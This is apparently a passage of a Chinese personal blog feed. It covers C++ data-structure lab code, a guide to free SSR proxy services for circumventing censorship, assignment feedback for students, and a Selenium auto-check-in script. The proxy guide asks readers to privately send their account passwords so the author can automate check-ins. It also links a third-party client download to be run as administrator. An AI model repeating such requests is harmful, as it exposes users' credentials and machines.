class="keyword">if</span>(S.top==S.base)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    e=*--S.top;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">StackEmpty</span><span class="params">(SqStack S)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top==S.base)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">SElemType <span class="title">GetTop</span><span class="params">(SqStack S)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(S.top!=S.base)</span><br><span class="line">        <span class="keyword">return</span> *(S.top<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//队列</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">InitQueue</span><span class="params">(SqQueue &amp;Q)</span><span class="comment">//构造一个空队列</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Q.base=<span class="keyword">new</span> QElemType[MAXSIZE];</span><br><span class="line">    <span class="keyword">if</span>(!Q.base)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    Q.front=Q.rear=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">EnQueue</span><span class="params">(SqQueue &amp;Q,QElemType e)</span><span class="comment">//元素入队</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>((Q.rear+<span class="number">1</span>)%MAXSIZE==Q.front)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    Q.base[Q.rear]=e;</span><br><span class="line">    Q.rear=(Q.rear+<span class="number">1</span>)%MAXSIZE;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">DeQueue</span><span class="params">(SqQueue &amp;Q,QElemType &amp;e)</span><span class="comment">//元素出队</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.front==Q.rear)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    e=Q.base[Q.front];</span><br><span class="line">    Q.front=(Q.front+<span class="number">1</span>)%MAXSIZE;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">QueueEmpty</span><span class="params">(SqQueue Q)</span><span class="comment">//判断队列是否为空</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(Q.rear==Q.front)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">DestroyQueue</span><span class="params">(SqQueue &amp;Q)</span><span class="comment">//销毁队列</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!Q.base)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    Q.rear=Q.front;</span><br><span class="line">    <span class="keyword">delete</span> Q.base;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"---------------------------"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"****by 夏日****"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"---------------------------"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"1-----创建二叉链表 "</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"2-----先序遍历"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"3-----中序遍历"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"4-----后序遍历"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"5-----层序遍历"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"6-----非递归中序遍历"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"7-----二叉树深度"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"8-----二叉树叶子结点个数"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"   退出,输入一个负数！"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="shu-chu-shi-li">输出示例</h1><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200423170805868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><h1 id="xie-zai-zui-hou">写在最后</h1><p>本文章仅供个人复习使用，如有错误，请联系我更正。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;shi-yan-xing-zhi-zong-he-xing-shi-yan&quot;&gt;实验性质：综合性实验&lt;/h1&gt;
&lt;h1 id=&quot;yao-qiu&quot;&gt;要求：&lt;/h1&gt;
&lt;p&gt;(1) 采用二叉链表结构建立二叉树；&lt;br&gt;
(2) 编程实现二叉树的先序、中序、后序和层序遍历
      
    
    </summary>
    
    
      <category term="数据结构" scheme="http://zssblog.top/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
      <category term="数据结构" scheme="http://zssblog.top/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>科学上网教程</title>
    <link href="http://zssblog.top/2020/04/22/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E6%95%99%E7%A8%8B/"/>
    <id>http://zssblog.top/2020/04/22/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E6%95%99%E7%A8%8B/</id>
    <published>2020-04-22T10:24:00.000Z</published>
    <updated>2020-05-31T10:10:28.121Z</updated>
    
    <content type="html"><![CDATA[<h1 id="shuo-ming">说明</h1><p>本次文章涉及的均为免费翻墙，效果肯定不如付费的。但如果不追求YouTube 4K画质足够平常用了。主要介绍ssr(目前在用)</p><h2 id="su-du-jie-tu" id="速度截图"><a class="header-anchor" href="#速度截图">¶</a>速度截图</h2><p>YouTube 4k视频速度，这个速度相当可以了，如果用过YouTube的应该知道<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200422172222546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><p>github下载速度测试，最快可达到2.3M/s（手机热点），一下40多M没了，有点心疼</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/2020042217273073.png"  alt="在这里插入图片描述"></p><p>其他的就不测了，一般这个速度完全满足大部分的需求了</p><h1 id="ssr-ji-chang">ssr机场</h1><p>ssr主要是各种机场，一般机场有免费流量，追求速度可以包月</p><p>接下来就介绍下几个我用的机场，大家看哪个好用用哪个，一般我都用</p><p>如果提示不能注册进相应的QQ群问管理员要注册链接</p><h2 id="zai-zai-yun" id="崽崽云"><a class="header-anchor" href="#崽崽云">¶</a>崽崽云</h2><p>免费节点情况：</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200422173510903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><p>QQ群：580539633</p><p>注册链接：<a href="https://zaizaicloud.pw/auth/register?code=gpBf" target="_blank" rel="noopener">https://zaizaicloud.pw/auth/register?code=gpBf</a></p><h2 id="n-95" id="N95"><a class="header-anchor" href="#N95">¶</a>N95</h2><p>免费节点情况：不巧，这几天免费节点正在维护，就不放截图了</p><p>QQ群：717740592</p><p>注册链接：<a href="https://n95cloud.com/auth/register?code=pIsY" target="_blank" rel="noopener">https://n95cloud.com/auth/register?code=pIsY</a></p><h2 id="you-yun-666" id="优云666"><a class="header-anchor" href="#优云666">¶</a>优云666</h2><p>免费节点情况：太多了，没截完</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200422173851471.png"  alt="image-20200422173851471"></p><p>没QQ群，TG群：<a href="https://t.me/youyun666" target="_blank" rel="noopener">https://t.me/youyun666</a></p><p>注册链接：<a href="https://youyun666.com/auth/register?code=6QxZ" target="_blank" rel="noopener">https://youyun666.com/auth/register?code=6QxZ</a></p><h2 id="xi-xicats" id="XiXicats"><a class="header-anchor" href="#XiXicats">¶</a>XiXicats</h2><p>免费节点情况：</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200422174309129.png"  alt="image-20200422174309129"></p><p>没QQ群</p><p>注册链接：<a href="https://xixicats.com/auth/register?code=p4LT" target="_blank" rel="noopener">https://xixicats.com/auth/register?code=p4LT</a></p><h1 id="ssr-shi-yong-jiao-cheng">ssr使用教程</h1><p>有了机场，那么我们怎么使用呢，别急，慢慢往下看</p><h2 id="ke-hu-duan-xia-zai" id="客户端下载"><a class="header-anchor" href="#客户端下载">¶</a>客户端下载</h2><blockquote><p>因为我用的linux版的客户端和Windows有点不一样，如果遇到问题下方留言</p></blockquote><p>下载 SSR 客户端，解压后以管理员身份运行 ShadowsocksR-dotnet4.0.exe。若系统提示需要安装 .NET Framework，请<a href="https://www.microsoft.com/net/download/dotnet-framework-runtime" target="_blank" rel="noopener">点此</a>访问微软官网下载安装。</p><p><a href="https://zaizaicloud.pw/client-download/ssr.7z" target="_blank" rel="noopener"> 客户端下载点我</a></p><h2 id="pei-zhi" id="配置"><a class="header-anchor" href="#配置">¶</a>配置</h2><p>下载好后我们去机场复制订阅链接</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200422174757757.png"  alt="image-20200422174757757"></p><p>然后找到添加订阅</p><p><img src="/" class="lazyload" data-src="https://zaizaicloud.pw/theme/malio/img/tutorial/windows-ssr-2.jpg"  alt="image-20200422175212224"></p><p>右键点击小飞机，选择 “服务器订阅” &gt; “更新SSR服务器订阅”</p><p><img src="/" class="lazyload" data-src="https://zaizaicloud.pw/theme/malio/img/tutorial/windows-ssr-3.jpg"  alt="image-20200422175420070"></p><p>鼠标放到服务器出现FreeSSR-public,然后会出现很多节点选择一个即可</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200422175606983.png"  alt="image-20200422175606983"></p><h2 id="xun-zhao-ji-chang-fang-fa" id="寻找机场方法"><a class="header-anchor" href="#寻找机场方法">¶</a>寻找机场方法</h2><p>以上机场也是我在YouTube看到的，其实这类机场还有很多，有需求的可去YouTube搜机场你就会发现一大堆人专门分享机场给你介绍</p><h2 id="ji-qiao" id="技巧"><a class="header-anchor" href="#技巧">¶</a>技巧</h2><p>之所以介绍好几个机场，是为了方便切换，如果使用过程突然不能用尝试更换节点即可</p><p>介绍下系统代理模式中的PAC和全局模式的区别</p><ul><li>PAC：有一个列表，列表内的网站都揍代理，比如常见的YouTube、google。优点是节省流量，大陆内网站访问速度较快，但打开部分外国会出现不走代理点情况，还有下载软件也不会走代理的</li><li>全局模式：既然PAC部分网站不走代理，那么全局模式就可以解决。全局即电脑所有流量均走代理，即使你访问大陆网站也是走代理，这样就会导致消耗更多的流量且访问大陆网站速度慢</li><li>建议平常开PAC、需要走全局的时候再切换全局模式</li></ul><h1 id="v-2-ray">v2ray</h1><p>v2ray和ssr类似，只不过v2ray目前比ssr稳定，也存在v2ray的机场，但是都没免费的，所以就不介绍了</p><h1 id="zi-xing-da-jian">自行搭建</h1><p>这点个人不推荐，花费较大，且速度没有保证，万一你选的服务器速度慢，那你就瞎了。如果追求速度稳定，建议购买机场包月，也不贵，一月才十来块，而且可以多人合买</p><h1 id="ssr-que-dian">ssr缺点</h1><p>介绍完ssr大家看了速度挺激动是吧，速度那么快，那还花钱包月干啥，事实是太天真了。</p><p>免费节点虽然部分节点速度确实快，但是会出现掉线的情况，比如用着用着不能用了，这个时候就要切换节点，而且高峰期的时候网速会打折扣。</p><p>但其实要不是每天看YouTube免费的就够用了，目前我还是用的白嫖的节点</p><p>因为我最近发现YouTube还挺好，有点想合买会员的冲动，有想合买的可滴滴我</p><h1 id="fu-li">福利</h1><p>对于免费机场大多采用每天签到可以领取1-5G流量的奖励，建议大家签到不然流量可能会不够用，当然如果你比较壕开个会员，那当我没说。</p><p>前几天用Python的selenium搭配linux的crontab写了个自动签到的脚本，实现每天自动签到，文章见：<a href="https://blog.csdn.net/zss192/article/details/105574863" target="_blank" rel="noopener">点我查看</a></p><p>用了几天的感受偶尔可能会签到失败，因为是外国的网站有时候打不开导致的(开代理就行)</p><p>如果大家不想每天苦逼的签到，去我csdn：<a href="https://blog.csdn.net/zss192" target="_blank" rel="noopener">点我查看</a>关注下(总不能让你白嫖吧)，私聊发我你账号密码就行</p><p>适用机场：崽崽云、N95（其他机场登录有验证所以脚本不能用）</p><p>放张脚本截图</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/1.jpg"  alt="Cache_2330dc506cd4d0e1."></p><h1 id="xie-zai-zui-hou">写在最后</h1><p>分享不易，如有帮助还望多支持下我的博客</p><p><a href="https://blog.csdn.net/zss192" target="_blank" rel="noopener">CSDN</a></p><p><a href="http://39.107.45.243/" target="_blank" rel="noopener">个人博客</a></p><p>有问题博客留言板留言或者文章下方留言</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;shuo-ming&quot;&gt;说明&lt;/h1&gt;
&lt;p&gt;本次文章涉及的均为免费翻墙，效果肯定不如付费的。但如果不追求YouTube 4K画质足够平常用了。主要介绍ssr(目前在用)&lt;/p&gt;
&lt;h2 id=&quot;su-du-jie-tu&quot; id=&quot;速度截图&quot;&gt;&lt;a class=&quot;h
      
    
    </summary>
    
    
      <category term="日常办公" scheme="http://zssblog.top/categories/%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/"/>
    
    
      <category term="日常办公" scheme="http://zssblog.top/tags/%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/"/>
    
  </entry>
  
  <entry>
    <title>第三次考核常见问题</title>
    <link href="http://zssblog.top/2020/04/22/%E7%AC%AC%E4%B8%89%E6%AC%A1%E8%80%83%E6%A0%B8%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/"/>
    <id>http://zssblog.top/2020/04/22/%E7%AC%AC%E4%B8%89%E6%AC%A1%E8%80%83%E6%A0%B8%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/</id>
    <published>2020-04-22T06:50:00.000Z</published>
    <updated>2020-04-25T01:51:06.977Z</updated>
    
    <content type="html"><![CDATA[<h1 id="wen-jian-jia-jie-gou-jiao-luan">文件夹结构较乱</h1><p>这次作业涉及多个页面所以文件夹结构至关重要，并不是说你完成了效果就行。以后会有几十个文件如果不注意这点，打开文件夹特别乱。</p><h3 id="zhu-yao-wen-ti-ru-xia" id="主要问题如下"><a class="header-anchor" href="#主要问题如下">¶</a>主要问题如下</h3><ul><li><p>根目录放多个css文件</p></li><li><p>根目录下放多个html文件</p></li><li><p>html文件放到img文件夹下或者其他不相关文件夹下</p></li></ul><h3 id="shi-li" id="示例："><a class="header-anchor" href="#示例：">¶</a>示例：</h3><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200422140159969.png"  alt="image-20200422140159969"></p><p>首页默认为index.html，这个之后你们学了php就知道了</p><h1 id="wen-jian-ming-ming-bu-gui-fan">文件命名不规范</h1><p>一个文件应该能让别人通过它的名字知道这个文件是干什么的，id和class命名也是如此</p><h3 id="zhu-yao-wen-ti-ru-xia-1" id="主要问题如下-v2"><a class="header-anchor" href="#主要问题如下-v2">¶</a>主要问题如下</h3><ul><li>文件命名为three1、three2、three3这种</li><li>文件命名含中文。以后根目录下的文件夹命名都不要含中文(容易出现乱码问题)</li></ul><h3 id="shi-li-1" id="示例：-v2"><a class="header-anchor" href="#示例：-v2">¶</a>示例：</h3><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200422140348689.png"  alt="image-20200422140348689"></p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200422140417192.png"  alt="image-20200422140417192"></p><h1 id="wei-wan-cheng-yao-qiu-quan-bu-nei-rong">未完成要求全部内容</h1><p>此次作业应含有首页、文章列表页、文章内容页、留言页面</p><p>首页应包含漂浮动画、轮播图</p><p>应做到缩放文章内容居中显示(具体效果随便打开个网页缩放看看啥效果)</p><h1 id="xiao-jian-yi">小建议</h1><p>这几次作业都是前端作业，由于前端是门面，所以尽量写的美观大方，起码做到自适应不会出bug。以后项目有可能会让自己设计网页，所以在后续作业可以多留意下网页元素设计。在有能力完成所有要求后可以尝试自行设计页面。</p><p>后续作业是后端(咱们实验室学的是php)，由于后续作业是在本次作业基础上完成，所以这次作业要尽量完成的较好。不然后面别人都在写php，你还在改着你的html。</p><h1 id="xie-zai-zui-hou">写在最后</h1><p>通过这几次的学习，想必大家都有不小的收获，但任重道远，我们都还有很多东西要学，作为你们的学长学姐，我们也只不过是比你们早学了一年。你们现在所遇到的问题我们当时或多或少的也都遇到过。</p><p>之所以给你们一次次指出问题，是我们不想让你们以后写项目或者工作了还因为这种小问题挨吵。你们没经历过甲方乙方是不太明白这种感觉的，别人出钱咱们给他们写网页，有什么问题或哪不满意别人都是直接提出来，他们是不问你多累多辛苦的，只要你没达到他们的要求那你就等着挨吵吧。</p><p>我们所能做的就是指出你们的问题让你们尽量多学点学精点。日后遇到任何实在解决不了的或者不清楚的问题，一定要及时问，要是不好意思在qq问，博客留言也都行，只要我们看到一定都会帮你们解决的。电脑有问题或者学习上的问题都可以。</p><h3 id="xiao-wen-juan" id="小问卷"><a class="header-anchor" href="#小问卷">¶</a>小问卷</h3><p>最后做个小问卷，之前答应大家的出些生活技能上的文章，不知道大家想要哪些方面的，之前写的我也不知道你们看没看，主要有</p><ul><li>google插件推荐   （日常更方便点）</li><li>搜索资源技巧 （搜索网盘资源、视频资源）</li><li>如何翻墙 （上YouTube、较快速度下载外国软件）</li><li>谈谈项目经验 (虽然也没做过几个，但也是有点经验)</li><li>…</li></ul><p>下方留言或者qq私聊，达到两三个人就出文章。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;wen-jian-jia-jie-gou-jiao-luan&quot;&gt;文件夹结构较乱&lt;/h1&gt;
&lt;p&gt;这次作业涉及多个页面所以文件夹结构至关重要，并不是说你完成了效果就行。以后会有几十个文件如果不注意这点，打开文件夹特别乱。&lt;/p&gt;
&lt;h3 id=&quot;zhu-yao-we
      
    
    </summary>
    
    
      <category term="107网站工作室" scheme="http://zssblog.top/categories/107%E7%BD%91%E7%AB%99%E5%B7%A5%E4%BD%9C%E5%AE%A4/"/>
    
    
      <category term="107网站工作室" scheme="http://zssblog.top/tags/107%E7%BD%91%E7%AB%99%E5%B7%A5%E4%BD%9C%E5%AE%A4/"/>
    
  </entry>
  
  <entry>
    <title>selenium搭配crontab实现自动签到</title>
    <link href="http://zssblog.top/2020/04/17/selenium%E6%90%AD%E9%85%8Dcrontab%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E7%AD%BE%E5%88%B0/"/>
    <id>http://zssblog.top/2020/04/17/selenium%E6%90%AD%E9%85%8Dcrontab%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E7%AD%BE%E5%88%B0/</id>
    <published>2020-04-17T08:45:00.000Z</published>
    <updated>2020-05-31T10:14:33.147Z</updated>
    
    <content type="html"><![CDATA[<h1 id="qi-yin">起因</h1><p>前几天接触到linux中的crontab可以定时完成更换壁纸、推送本地文件到github等功能。这几天想着可不可以弄个自动签到的脚本，本来用的爬虫带cookie实现登录然后签到，但是过几天cookie失效就凉凉了。偶然的机会了解到selenium可以模拟浏览器点击，于是找了找关于自动签到的文章学习下，在次记录下。</p><h1 id="selenium-jian-jie">selenium简介</h1><p>Selenium 是一个综合性的项目，为web浏览器的自动化提供了各种工具和依赖包。他有很多功能。此次主要结合Python，功能可以理解为可以模拟一个浏览器并进行各种点击、填写账号密码等操作。</p><h1 id="fang-zhang-jie-tu">放张截图</h1><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20200417161530715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><h1 id="yao-dian">要点</h1><p>主要是选取到合适的元素，假装代码是一个人，你要先打开网页，然后输入账号，然后你要点击登录这样的按钮，对于代码来说它要先找到登录的按钮才能进行点击等操作。所以查找的合适精准至关重要。</p><h2 id="cha-zhao-yuan-su" id="查找元素"><a class="header-anchor" href="#查找元素">¶</a>查找元素</h2><p>通过id</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driver.find_element_by_id(<span class="string">'loginForm'</span>)</span><br></pre></td></tr></table></figure><p>通过name</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driver.find_element_by_name(<span class="string">'username'</span>)</span><br></pre></td></tr></table></figure><p>通过Xpath</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#绝对定位 (页面结构轻微调整就会被破坏)</span></span><br><span class="line">driver.find_element_by_xpath(<span class="string">"/html/body/form[1]"</span>)</span><br><span class="line"><span class="comment">#HTML页面中的第一个form元素</span></span><br><span class="line">driver.find_element_by_xpath(<span class="string">"//form[1]"</span>)</span><br><span class="line"><span class="comment">#包含 id 属性并且其值为 loginForm 的form元素</span></span><br><span class="line">driver.find_element_by_xpath(<span class="string">"//form[@id='loginForm']"</span>)</span><br></pre></td></tr></table></figure><blockquote><p>对于查找而言，你可以F12选中一个元素然后右键选择Copy便有copy xpath等选项</p></blockquote><h2 id="qi-ta-yao-dian" id="其他要点"><a class="header-anchor" href="#其他要点">¶</a>其他要点</h2><p>点击操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driver.find_element_by_xpath(<span class="string">'/html/body/div[2]/button'</span>).click()</span><br></pre></td></tr></table></figure><p>填写信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driver.find_element_by_id(<span class="string">'email'</span>).send_keys(username)</span><br></pre></td></tr></table></figure><p>获取元素内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driver.find_element_by_xpath(<span class="string">'//*[@id="swal2-content"]'</span>).text</span><br></pre></td></tr></table></figure><h1 id="que-dian">缺点</h1><p>对于selenium我个人感觉最大的缺点就是比较慢，相对于爬虫速度慢点多，代码中虽然用到了禁用图片、设置超时等操作但还是比较慢。不过对于自动签到而言，慢一点也没什么太大的影响，只要能稳定就行。</p><h1 id="dai-ma">代码</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">功能：自动签到脚本</span></span><br><span class="line"><span class="string">配置：登录地址 + 账号 + 密码</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> NoSuchElementException</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkin</span><span class="params">(login_url,username,password)</span>:</span></span><br><span class="line">    chrome_options = Options()  <span class="comment">#解决使用chrome报错</span></span><br><span class="line">    chrome_options.add_argument(<span class="string">'--headless'</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">'--no-sandbox'</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">'--disable-dev-shm-usage'</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">"enable-automation"</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">"--headless"</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">"--window-size=1920,1080"</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">"--no-sandbox"</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">"--disable-extensions"</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">"--dns-prefetch-disable"</span>)</span><br><span class="line">    chrome_options.add_argument(<span class="string">"--disable-gpu"</span>)</span><br><span class="line"></span><br><span class="line">    chrome_prefs = &#123;&#125;   <span class="comment">#禁止加载图片以提高速度</span></span><br><span class="line">    chrome_options.experimental_options[<span class="string">"prefs"</span>] = chrome_prefs</span><br><span class="line">    chrome_prefs[<span class="string">"profile.default_content_settings"</span>] = &#123;<span class="string">"images"</span>: <span class="number">2</span>&#125;</span><br><span class="line">    chrome_prefs[<span class="string">"profile.managed_default_content_settings"</span>] = &#123;<span class="string">"images"</span>: <span class="number">2</span>&#125;</span><br><span class="line">    driver = webdriver.Chrome(options=chrome_options, executable_path=<span class="string">'/usr/bin/chromedriver'</span>)  <span class="comment"># 初始化chrome</span></span><br><span class="line">    driver.set_page_load_timeout(<span class="number">30</span>) <span class="comment">#设置超时以提高速度</span></span><br><span class="line">    driver.maximize_window()  <span class="comment"># 最大化窗口</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        driver.get(login_url)  <span class="comment"># 进入登录页面</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        driver.execute_script(<span class="string">"window.stop()"</span>) <span class="comment">#加载超时停止加载执行下一步操作</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">"当前页面为："</span>+driver.find_element_by_xpath(<span class="string">'//*[@id="app"]/section/div/div[1]/div/h4/span'</span>).text)</span><br><span class="line">    print(<span class="string">"当前账号为："</span>+username)</span><br><span class="line">    print(<span class="string">"--------------------------------"</span>)</span><br><span 